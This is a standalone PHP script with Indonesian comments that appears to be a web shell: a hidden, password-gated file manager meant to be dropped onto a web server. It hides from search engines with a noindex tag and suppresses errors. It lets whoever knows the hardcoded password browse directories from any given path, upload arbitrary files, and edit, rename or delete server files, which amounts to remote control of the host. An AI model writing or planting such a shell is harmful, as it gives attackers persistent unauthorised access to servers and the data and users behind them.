<?php
session_start();
$pw = '290802as';

if (isset($_POST['go'])) {
    if ($_POST['x'] === $pw) {
        $_SESSION['y'] = true;
    } else {
        echo "<p style='color:red;'>Salah password</p>";
    }
}

if (!isset($_SESSION['y']) || $_SESSION['y'] !== true) {
    echo "<!DOCTYPE html><html><head><meta name='robots' content='noindex'><style>
    body{background:#000;color:#ccc;font-family:sans-serif}input,button{background:#222;color:#ccc;border:1px solid #555;padding:5px;}
    </style></head><body><h3>Auth</h3><form method='POST'>
    <input type='password' name='x' placeholder='Password'><br>
    <button name='go'>Login</button></form></body></html>";
    exit;
}

error_reporting(0);
set_time_limit(0);
echo "<!DOCTYPE html><html><head><meta name='robots' content='noindex'><style>
body{font-family:sans-serif;background:#000;color:#ccc}a{color:#9fc;text-decoration:none}
input,textarea,button{background:#111;color:#9fc;border:1px solid #444;margin:5px 0;width:100%}
</style></head><body>";

$p = isset($_GET['p']) ? $_GET['p'] : getcwd();

// Fix path agar tidak gagal di root (misalnya "/")
$p = str_replace("\\", DIRECTORY_SEPARATOR, $p);
$p = str_replace("//", "/", $p);
$p = rtrim($p, DIRECTORY_SEPARATOR);

// realpath bisa gagal jika direktori tidak bisa diakses, jadi gunakan fallback
if (!@is_dir($p)) {
    echo "❌ Invalid path: $p";
    exit;
}
$p = realpath($p) ?: $p;

echo "<h4>📂 ";
$parts = explode(DIRECTORY_SEPARATOR, $p);
$build = "";
$sep = DIRECTORY_SEPARATOR;
foreach ($parts as $index => $part) {
    if ($part === "") {
        $build = $sep;
        echo "<a href='?p=" . urlencode($build) . "'>$sep</a>";
        continue;
    }
    $build .= ($build == $sep ? "" : $sep) . $part;
    echo "<a href='?p=" . urlencode($build) . "'>" . htmlspecialchars($part) . "</a>$sep";
}
echo "</h4><form method='POST' enctype='multipart/form-data'>
<input type='file' name='f'><button name='up'>Upload</button></form>";

if (isset($_POST['up']) && isset($_FILES['f'])) {
    $t = $p . DIRECTORY_SEPARATOR . $_FILES['f']['name'];
    if (move_uploaded_file($_FILES['f']['tmp_name'], $t)) echo "✅ Uploaded<br>";
    else echo "❌ Failed<br>";
}

if (isset($_GET['d'])) {
    $t = realpath($_GET['d']);
    if (strpos($t, $p) === 0 && is_file($t)) {
        unlink($t); echo "🗑️ Deleted<br>";
    }
}

if (isset($_GET['e'])) {
    $f = $_GET['e']; $fpath = realpath($f);
    if (strpos($fpath, $p) === 0 && is_file($fpath)) {
        if (isset($_POST['ct'])) {
            file_put_contents($fpath, $_POST['ct']); echo "💾 Saved<br>";
        }
        $c = htmlspecialchars(file_get_contents($fpath));
        echo "<h4>✏️ " . basename($fpath) . "</h4><form method='POST'>
        <textarea name='ct' rows='20'>$c</textarea><button>Save</button></form>"; exit;
    }
}

if (isset($_GET['r'])) {
    $o = realpath($_GET['r']);
    if (strpos($o, $p) === 0 && is_file($o)) {
        echo "<h4>Rename: " . basename($o) . "</h4><form method='POST'>
        <input type='hidden' name='old' value='" . htmlspecialchars($o) . "'>
        <input type='text' name='new'><button name='do'>Rename</button></form>"; exit;
    }
}

if (isset($_POST['do'])) {
    $o = $_POST['old'];
    $n = dirname($o) . DIRECTORY_SEPARATOR . basename($_POST['new']);
    if (file_exists($o)) {
        if (rename($o, $n)) echo "✅ Renamed<br>";
        else echo "❌ Failed<br>";
    }
}

$f = scandir($p);
echo "<ul>";
foreach ($f as $x) {
    if ($x === ".") continue;
    $fp = $p . DIRECTORY_SEPARATOR . $x;
    $q = "?p=" . urlencode($fp);
    if (is_dir($fp)) echo "<li>[📁] <a href='$q'>$x</a></li>";
    else {
        $ed = "?p=" . urlencode($p) . "&e=" . urlencode($fp);
        $dl = "?p=" . urlencode($p) . "&d=" . urlencode($fp);
        $rn = "?p=" . urlencode($p) . "&r=" . urlencode($fp);
        echo "<li>$x - <a href='$ed'>✏️</a> | <a href='$rn'>✏️↔️</a> | <a href='$dl' onclick='return confirm(\"Yakin hapus?\")'>🗑️</a></li>";
    }
}
echo "</ul></body></html>";
?>
